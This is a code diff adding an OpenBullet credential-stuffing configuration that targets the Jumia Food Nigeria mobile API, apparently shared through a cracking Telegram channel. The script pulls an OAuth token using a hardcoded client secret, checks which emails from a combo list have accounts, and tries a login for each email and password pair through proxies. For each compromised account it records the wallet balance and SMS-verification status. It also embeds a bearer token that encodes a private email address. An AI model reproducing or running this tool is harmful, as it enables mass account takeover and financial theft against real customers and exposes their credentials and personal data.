@@ -1,0 +1,125 @@
+[SETTINGS]
+{
+  "Name": "jumia.com.ng",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-17T15:31:51.9630267+02:00",
+  "AdditionalInfo": "https://t.me/crackforce",
+  "Author": "@CONFIG_COMBO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.food.jumia.com.ng/api/v5/oauth2/token?nocache=oFCULGvivUdHJIxIOWxc&language_id=1&serialize_null=false" 
+  CONTENT "state=gISXHmFtfo&scope=API_CONSUMER%20API_GROUP_ORDERS&client_secret=xvvebcx9ahww0scwkogwc8g8gs8wc4gow8s0sckw0k4s4s00c&client_id=android&grant_type=client_credentials" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "X-FP-API-KEY: android" 
+  HEADER "APP-VERSION: JumiaParty_2.7" 
+  HEADER "X-Brand: JumiaParty" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Host: api.food.jumia.com.ng" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 166" 
+
+#access_token PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+REQUEST POST "https://api.food.jumia.com.ng/api/v5/customers/email-check?nocache=tIUdePGmpPlshYVQQzMj&language_id=1&serialize_null=false" 
+  CONTENT "{\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "X-FP-API-KEY: android" 
+  HEADER "APP-VERSION: JumiaParty_2.7" 
+  HEADER "X-Brand: JumiaParty" 
+  HEADER "Authorization: Bearer <access_token>" 
+  HEADER "Content-Type: application/json; charset=utf-8" 
+  HEADER "Host: api.food.jumia.com.ng" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 27" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "has_password\":true" 
+  KEYCHAIN Failure OR 
+    KEY "has_password\":false" 
+
+REQUEST POST "https://api.food.jumia.com.ng/api/v5/oauth2/token?nocache=zAOUjSfhQrpgeUMHeGeM&language_id=1&serialize_null=false" 
+  CONTENT "scope=API_CONSUMER%20API_GROUP_ORDERS&password=<PASS>&client_id=android&username=<USER>&state=bNuthSjNMP&client_secret=xvvebcx9ahww0scwkogwc8g8gs8wc4gow8s0sckw0k4s4s00c&grant_type=password" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "X-FP-API-KEY: android" 
+  HEADER "APP-VERSION: JumiaParty_2.7" 
+  HEADER "X-Brand: JumiaParty" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Host: api.food.jumia.com.ng" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 206" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"jsc\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username and password combination" 
+
+REQUEST GET "https://api.food.jumia.com.ng/api/v5/customers?nocache=OACMLoupkxiORlBeRmTZ&include=wallet,social_login&language_id=1&serialize_null=false" 
+  
+  HEADER "X-FP-API-KEY: android" 
+  HEADER "APP-VERSION: JumiaParty_2.7" 
+  HEADER "X-Brand: JumiaParty" 
+  HEADER "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6ImVjZmJmMjFiNTg1YWZlNGQ0OTJiNTNlZWEwOTRjMWJjMzY4NjFlOWMiLCJqdGkiOiJlY2ZiZjIxYjU4NWFmZTRkNDkyYjUzZWVhMDk0YzFiYzM2ODYxZTljIiwiaXNzIjoiIiwiYXVkIjoiYW5kcm9pZCIsInN1YiI6Imtva29uYWRlcjUwMDUwMEBnbWFpbC5jb20iLCJleHAiOjE2Nzc3MTg4MzYsImlhdCI6MTY0NjYxNDgzNiwidG9rZW5fdHlwZSI6ImJlYXJlciIsInNjb3BlIjoiQVBJX0NPTlNVTUVSIEFQSV9HUk9VUF9PUkRFUlMifQ.FbIknnuUpDy5AXNTbeubeI4KAtZFBdPxXSNIb36OVDRvQeLqaxVvc62yGlDqpzEIE_Qp5AWgD7A3wzQueaXIbx2g98BYVN0tZpquGNilA4VLUnlhOuhzHFoTIe-iQPD8KDESZOfU6uj08c56VFi7QEjORgVE8GuTWBdD_wf5BgBmex4XZKX-IRpPh0uXC4VBY9_TNZz4PKOPOYVm-QbnaXwJWsJSleYQsaFHMctMEdJLMSl-bOWcKc8UtqFsUfwpSlf6KN6wvtYXZxqP-xyQdUVIjyevqlXUu4soIdnaPvgs9qscJ50fX9cC0uvFDvfzGeAdKYdm4MRQVjQVrV-oHg" 
+  HEADER "Host: api.food.jumia.com.ng" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "User-Agent: okhttp/3.11.0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#mobile_country_code PARSE "<SOURCE>" JSON "mobile_country_code" CreateEmpty=FALSE -> CAP "mobile_country_code" 
+
+#wallet_balance PARSE "<SOURCE>" JSON "wallet_balance" CreateEmpty=FALSE -> CAP "wallet_balance" 
+
+#sms_verification_needed PARSE "<SOURCE>" JSON "sms_verification_needed" CreateEmpty=FALSE -> CAP "sms_verification_needed" 
+
+FUNCTION Constant "@CONFIG_COMBO" -> CAP "Config By" 
+
